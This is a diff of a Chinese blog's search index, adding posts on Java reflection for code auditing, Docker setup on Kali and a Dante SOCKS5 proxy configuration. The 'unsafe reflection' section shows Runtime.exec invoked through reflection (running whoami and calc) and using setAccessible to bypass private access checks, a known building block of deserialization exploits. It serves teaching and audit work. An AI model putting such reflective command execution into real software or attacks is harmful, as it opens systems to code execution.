+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>        Class userClass = Class.forName(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>查看<code>Class.forName</code>的实现，本质就是通过Reflection来实现对应的Class对象的加载。</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20240229154657831.png"
+alt="image-20240229154657831" /></p>
+<p><code>Class.forName</code>有两种重载形式</p>
+<ol type="1">
+<li>name：要加载的类的全名</li>
+<li>initalize：是否初始化类</li>
+<li>loader：类加载器</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String name, <span class="hljs-keyword">boolean</span> initialize, ClassLoader loader);<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; forName(String name);<br></code></pre></td></tr></table></figure>
+<h3 id="反射机制classloader方式">3.1.5、反射机制classLoader方式</h3>
+<p>通过classLoader的方式，我们利用类加载器获取到相应的Class对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<h2 id="获取类的信息">3.2、获取类的信息</h2>
+<h3 id="常用的api">3.2.1、常用的API</h3>
+<p>这里我们列举常见的Class类的方法，用于获取类的信息。</p>
+<p>在用API的时候，有的时候会混乱，建议理清两个点。</p>
+<ol type="1">
+<li>谁是谁的属性/方法（which belongs to which）</li>
+<li>Field/Method/Class不代表某个单一实例（调用方法，变量修改都是基于实例完成）</li>
+</ol>
+<p>（1）返回类的公有Method</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getMethod(String name, Class&lt;?&gt;... parameterTypes);<br></code></pre></td></tr></table></figure>
+<p>（2）返回所有声明的Method类对象，包括公共，保护，默认（包）访问和私有方法，但不包括继承的方法。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes);<br></code></pre></td></tr></table></figure>
+<p>（3）返回已加载类声明的所有public成员变量的Field对象，包括从父类继承过来的成员变量，参数name指定成员变量的名称。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getField(String name)<br></code></pre></td></tr></table></figure>
+<p>（4）返回当前类所有成员变量的Field对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.Class.getDeclaredField(String name)<br></code></pre></td></tr></table></figure>
+<p>（5）返回obj对象的Field属性值</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.get(Object obj) <br></code></pre></td></tr></table></figure>
+<p>（6）向obj对象的这个Field属性设置新值value。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.set(Object obj, Object value) <br></code></pre></td></tr></table></figure>
+<p>（7）返回该Field已声明的修饰符集的整数值。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.getModifiers() <br></code></pre></td></tr></table></figure>
+<p>（8）将该Field的值设置为指定obj对象上的int值。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.lang.reflect.Field.setInt(Object obj, <span class="hljs-keyword">int</span> i)<br></code></pre></td></tr></table></figure>
+<p>（9）<strong>field.setAccessible(boolean flag)</strong></p>
+<p>一般情况下，我们并不能对类的私有字段进行操作，而setAccessible则是<strong>启用和禁用访问安全检查的开关</strong>。flag值为
+true 则指示反射的对象在使用时应该取消 Java 语言访问检查。</p>
+<p>（10）java.lang.reflect.Modifier</p>
+<p>修饰符工具类，提供解码类和成员访问修饰符的静态方法和常量，修饰符集合具有表示不同的修饰符的不同位置的整数。</p>
+<p>（11）java.lang.reflect.Modifier.toString(int modifiers)</p>
+<p>获得修饰符的文本形式</p>
+<h3 id="调用公有方法">3.2.2、调用公有方法</h3>
+<p>假设现在有一个User类，User类定义如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name = <span class="hljs-string">&quot;Tom&quot;</span>;<br>    <span class="hljs-keyword">private</span> String secret = <span class="hljs-string">&quot;cipher&quot;</span>;<br><br>    User(String name)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">setSecret</span><span class="hljs-params">(String secret)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">this</span>.secret = secret;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这里我们使用<code>getMethod</code>方法获取到getName和setName，实现User类的方法调用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        Method userGetName = userClass.getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        Object invoke = userGetName.invoke(admin);<br>        System.out.println(<span class="hljs-string">&quot;Reflect get original Name : &quot;</span> + (String)invoke);<br><br>        Method userSetName = userClass.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>        userSetName.invoke(admin, <span class="hljs-string">&quot;admin_new&quot;</span>);<br><br>        invoke = userGetName.invoke(admin);<br>        System.out.println(<span class="hljs-string">&quot;Reflect set new Name : &quot;</span> + (String)invoke);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="访问私有方法和属性">3.2.3、访问私有方法和属性</h3>
+<p>访问私有方法和属性，我们要注意<code>setAccessible</code>方法，否则我们的操作会受到访问修饰符的限制。</p>
+<p>在公有方法的基础上，我们绕过访问修饰符从而实现反射。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException</span>&#123;<br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        Field userSecret = userClass.getDeclaredField(<span class="hljs-string">&quot;secret&quot;</span>);<br>        <span class="hljs-comment">// 修饰符检查</span><br>        userSecret.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object secret = userSecret.get(admin);<br>        System.out.println(<span class="hljs-string">&quot;original secret : &quot;</span> + (String)secret);<br><br>        Method userSetSecret = userClass.getDeclaredMethod(<span class="hljs-string">&quot;setSecret&quot;</span>, String.class);<br>        <span class="hljs-comment">// 修饰符检查</span><br>        userSetSecret.setAccessible(<span class="hljs-keyword">true</span>);<br>        userSetSecret.invoke(admin, <span class="hljs-string">&quot;cipher_new&quot;</span>);<br><br>        secret = userSecret.get(admin);<br>        System.out.println(<span class="hljs-string">&quot;new secret : &quot;</span> + (String)secret);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="修改属性修饰符">3.2.4、修改属性修饰符</h3>
+<p>Filed对象具有Modifiers属性，用来描述当前Filed表示的属性在类中的修饰符。</p>
+<p>我们可以通过反射获取到secret属性对应的Field对象，再通过反射修改secret
+Field对象的Modifiers属性，能够通过改变修饰符，影响对应的变量。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException</span>&#123;<br><br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        User admin = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&quot;admin&quot;</span>);<br><br>        <span class="hljs-comment">// 反射获取secret属性</span><br>        Field userSecret = userClass.getDeclaredField(<span class="hljs-string">&quot;secret&quot;</span>);<br><br>        <span class="hljs-comment">// 反射获取secret的Modifiers</span><br>        Field secretModifiers = userSecret.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<br>        secretModifiers.setAccessible(<span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-comment">// 删除对应的PRIVATE属性</span><br>        secretModifiers.setInt(userSecret, userSecret.getModifiers() &amp; ~Modifier.PRIVATE);<br><br>        <span class="hljs-comment">// 注意此时userSecret没有setAccessible</span><br>        <span class="hljs-comment">// 成功修改属性</span><br>        userSecret.set(admin, <span class="hljs-string">&quot;cipher_new&quot;</span>);<br>        System.out.println(admin.getSecret());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="获取构造器">3.2.5、获取构造器</h3>
+<p>反射实现实例的构造，Java提供两种方法。</p>
+<p><img
+src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20240229203926563.png"
+alt="image-20240229203926563" /></p>
+<p>通过Construct属性，我们可获取对象的Construct方法。针对不同的构造器，我们通过反射时指定不同的参数获取相应的构造器。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span></span><br><span class="hljs-function">            ClassNotFoundException,NoSuchMethodException,</span><br><span class="hljs-function">            java.lang.IllegalAccessException, java.lang.reflect.InvocationTargetException,</span><br><span class="hljs-function">            java.lang.NoSuchFieldException, java.lang.InstantiationException</span>&#123;<br><br>        Class userClass = ClassLoader.getSystemClassLoader().loadClass(<span class="hljs-string">&quot;com.exampl.demo.entity.User&quot;</span>);<br>        System.out.println(userClass.getName());<br><br>        <span class="hljs-comment">// 获取有参构造器</span><br>        Constructor con = userClass.getDeclaredConstructor(String.class);<br>        User user = (User)(con.newInstance(<span class="hljs-string">&quot;user&quot;</span>));<br>        System.out.println(user.getName());<br><br>        <span class="hljs-comment">// 获取无参构造器</span><br>        Constructor con1 = userClass.getDeclaredConstructor(<span class="hljs-keyword">null</span>);<br>        Object user1 = con1.newInstance();<br>        Method userGetName = userClass.getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(userGetName.invoke(user1));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="不安全的反射">3.3、不安全的反射</h2>
+<h3 id="命令执行">3.3.1、命令执行</h3>
+<p>基于反射机制，我们能够成功实现命令执行，而不需要显式地导入相应的类。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exampl.demo.entity;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoExec</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, IOException </span>&#123;<br>        Class execClass = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><br>        <span class="hljs-comment">// 构造实例</span><br>        Constructor declaredConstructor = execClass.getDeclaredConstructor(<span class="hljs-keyword">null</span>);<br>        declaredConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        java.lang.Runtime runner =  (java.lang.Runtime) declaredConstructor.newInstance();<br><br>        <span class="hljs-comment">// 命令执行方法</span><br>        Method exec = execClass.getDeclaredMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        Process p = (Process)exec.invoke(runner, <span class="hljs-string">&quot;whoami&quot;</span>);<br><br>        <span class="hljs-comment">// 输出结果</span><br>        BufferedReader bufReader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(p.getInputStream()));<br>        String line = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span>((line = bufReader.readLine()) != <span class="hljs-keyword">null</span>)<br>        &#123;<br>            System.out.println(line);<br>        &#125;<br>        bufReader.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>通过分析一下两个函数test1和test2之间的对应关系，能更好地理解Java反射。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>    Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException </span>&#123;<br>    Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<br>        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(<br>            <span class="hljs-keyword">null</span>),<span class="hljs-string">&quot;calc&quot;</span><br>    );<br>&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="代理模式">4、代理模式</h1>
+<p>代理模式提供了对目标对象额外的访问方式，即通过代理对象访问目标对象，这样可以在不修改原目标对象的前提下，<strong>提供额外的功能操作</strong>，<strong>扩展目标对象的功能</strong>。简言之，代理模式就是设置一个<strong>中间代理</strong>来控制访问原目标对象，以达到增强原对象的功能和简化访问方式。但是对于真正的调用来说,
+实际上并不关心这个代理对象, 只要能够实现相应的业务逻辑就好。</p>
+<h2 id="静态代理">4.1、静态代理</h2>
+<h2 id="动态代理">4.2、动态代理</h2>
+<h1 id="反序列化">5、反序列化</h1>
 ]]></content>
       <categories>
         <category>代码审计</category>
@@ -2270,6 +2270,86 @@ alt="image-20240421223256733" /></p>
       </tags>
   </entry>
   <entry>
+    <title>kali2021 docker安装配置</title>
+    <url>/2023/09/06/blog0035-kali2021-docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>记录一下kali 2021的docker安装过程</p>
+<p>后续持续更新一些docker常用的命令</p>
+<span id="more"></span>
+<h2 id="安装证书-https-dirmngr">1、安装证书 https dirmngr</h2>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">apt-get update <br>apt-get install -y apt-transport-https ca-certificates <br>apt-get install dirmngr<br></code></pre></td></tr></table></figure>
+<h2 id="密钥与更新源">2、密钥与更新源</h2>
+<p>echo可能会权限不够，可以先切换到root用户完成该命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<br>echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure>
+<h2 id="安装docker">3、安装docker</h2>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">apt install docker.io<br></code></pre></td></tr></table></figure>
+<h2 id="用户添加docker组">4、用户添加docker组</h2>
+<p>将kali用户添加至docker组</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo usermod -aG docker kali<br></code></pre></td></tr></table></figure>
+<p>添加完之后记得重新登录，比如注销再登录</p>
+<h2 id="检查安装">5、检查安装</h2>
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br><span class="hljs-attribute">docker -v</span><br></code></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>danted socks5代理服务器配置</title>
+    <url>/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>最近研究了一下如何搭建socks5代理服务器，选择了danted做了一些分析。</p>
+<p>不过danted的官网的配置有些是错的，很多博客说的也不是非常详细，因此自己结合官网说明和实践测试，最后整了一篇文章。</p>
+<h2 id="目标">目标</h2>
+<ol type="1">
+<li>实现身份认证访问代理服务器</li>
+<li>实现白名单目标服务器访问</li>
+<li>按天分割日志</li>
+</ol>
+<h2 id="danted命令">1、danted命令</h2>
+<h3 id="安装">1.1、安装</h3>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install dante-server<br></code></pre></td></tr></table></figure>
+<h3 id="运行">1.2、运行</h3>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systemctl start danted.service   	// 运行<br>systemctl restart danted.service	// 重启<br></code></pre></td></tr></table></figure>
+<h2 id="重要配置解读">2、重要配置解读</h2>
+<p>官网主页：<a
+href="http://www.inet.no/dante/doc/1.4.x/config/index.html">Dante官方配置</a></p>
+<p>服务器设置</p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">logoutput		日志输出位置，可以使用stdout/文件名<br>				注意: danted的日志不支持输出到/var/<span class="hljs-keyword">log</span>目录下，官网的配置文档有误<br>					 建议的形式是在根目录下额外开一个/danted目录来做日志文件夹<br>				参考链接:https://www.linuxquestions.org/questions/linux-software<span class="hljs-number">-2</span>/dante-socks-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">not</span>-running-<span class="hljs-keyword">as</span>-root-<span class="hljs-keyword">no</span>-<span class="hljs-keyword">access</span>-<span class="hljs-keyword">to</span>-var-<span class="hljs-keyword">log</span><span class="hljs-number">-4175674993</span>/<br><br><span class="hljs-type">internal</span>		用于指定代理服务器监听的接口（或地址）和端口。<br>				即客户端连接的地址，可以使用IP或者网卡(如eth0)来代指<br><br><span class="hljs-keyword">external</span>		用于指定代理服务器向目标服务器发起连接的接口<br>				可以使用IP或者网卡名称来指代<br>			<br>socksmethod		socks代理服务采用的身份认证方式<br><br>clientmethod	客户端连接时采用的身份认证（不设置即可）<br><br><span class="hljs-keyword">user</span>.privileged	需要使用特权的时候，使用的用户权限<br><span class="hljs-keyword">user</span>.unprivileged 不需要特权的时候，使用的用户权限<br><br></code></pre></td></tr></table></figure>
+<p>流量设置</p>
+<p>client
+pass，默认采用正向代理方式，控制哪些客户端可以连接（类似防火墙的访问控制列表），一般直接放行即可。</p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">client pass &#123;<br>        <span class="hljs-keyword">from</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span> <span class="hljs-keyword">to</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span><br>        <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> <span class="hljs-comment"># connect disconnect tcpinfo iooperation</span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>socks pass，默认采用正向代理方式，控制客户端和目标服务器的白名单</p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">socks pass &#123;<br>    <span class="hljs-keyword">from</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.166</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <span class="hljs-keyword">to</span>: www.ichunqiu.com<br>    <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> connect disconnect <span class="hljs-comment"># tcpinfo </span><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>日志设置</p>
+<p>在client pass和socks
+pass中，默认输出的日志是info，不需要额外的设置。</p>
+<p>当然也可以自己选择增加error、connect、disconnect、tcpinfo、iooperation这五个种额外输出。</p>
+<h2 id="配置文件样例">3、配置文件样例</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">#日志保存位置<br>errorlog: syslog<br>logoutput: /danted/sockd.log<br><br>#特权&amp;非特权<br>user.privileged: root<br>user.unprivileged: nobody<br><br>internal: 0.0.0.0 port = 1080<br>external: 10.255.200.72<br><br># method: username<br>socksmethod: username<br><br>#允许来自内部的用户访问dante代理服务器<br>client pass &#123;<br>        from: 0.0.0.0/0 to: 0.0.0.0/0<br>        log: error # connect disconnect tcpinfo iooperation<br>&#125;<br><br>#允许访问的外部指定地址<br>socks pass &#123;<br>    from: 192.168.166.0/24 to: www.ichunqiu.com<br>    log: error connect disconnect # tcpinfo <br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="日志切割">4、日志切割</h2>
+<p>日志切割采用定时任务完成</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>* * * * /bin/bash -c <span class="hljs-string">&quot;/danted/daily_log.sh&quot;</span><br></code></pre></td></tr></table></figure>
+<p>对应的daily_log.sh的文件内容</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置日志文件路径</span><br>log_file=&quot;/danted/sockd.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 获取当前日期</span><br>current_date=$(date +&quot;%Y-%m-%d&quot;)<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置保存目录</span><br>log_dir=&quot;/danted&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 构建新的日志文件名</span><br>new_log_file=&quot;$log_dir/sockd_$current_date.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 检查日志目录是否存在，如果不存在则创建</span><br>if [ ! -d &quot;$log_dir&quot; ]; then<br>    mkdir -p &quot;$log_dir&quot;<br>fi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 判断日志文件是否存在</span><br>if [ -f &quot;$log_file&quot; ]; then<br>    # 备份并重命名日志文件<br>    cp &quot;$log_file&quot; &quot;$new_log_file&quot;<br>    # 清空原日志文件<br>    echo &quot;&quot; &gt; &quot;$log_file&quot;<br>fi<br></code></pre></td></tr></table></figure>
+<h2 id="小尾巴">5、小尾巴</h2>
+<p>当然上面还留了一个问题，danted
+的访问控制基于IP而不是用户。danted本身无法根据用户身份实现对目标服务器的访问控制。</p>
+<p>比如我希望A用户只能通行www.baidu.com，B用户只能通行www.qq.com，这个danted目前是做不到的，除非A、B用户的IP是固定的。</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>代理</tag>
+        <tag>socks5</tag>
+        <tag>服务器</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>php反序列化绕过 wakeup 总结</title>
     <url>/2023/08/26/blog0032-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-wakeup%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<p>上次某个比赛看到PHP反序列化的__wakeup绕过，发现自己竟然只知道利用属性个数异常的来绕过一种方法。确实是比赛打得太少了，很多trick都不知道，特地找了些博客去分析了一下。</p>
@@ -2350,281 +2430,6 @@ href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">C绕过
         <tag>Web</tag>
         <tag>ctf</tag>
         <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>danted socks5代理服务器配置</title>
-    <url>/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>最近研究了一下如何搭建socks5代理服务器，选择了danted做了一些分析。</p>
-<p>不过danted的官网的配置有些是错的，很多博客说的也不是非常详细，因此自己结合官网说明和实践测试，最后整了一篇文章。</p>
-<h2 id="目标">目标</h2>
-<ol type="1">
-<li>实现身份认证访问代理服务器</li>
-<li>实现白名单目标服务器访问</li>
-<li>按天分割日志</li>
-</ol>
-<h2 id="danted命令">1、danted命令</h2>
-<h3 id="安装">1.1、安装</h3>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install dante-server<br></code></pre></td></tr></table></figure>
-<h3 id="运行">1.2、运行</h3>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">systemctl start danted.service   	// 运行<br>systemctl restart danted.service	// 重启<br></code></pre></td></tr></table></figure>
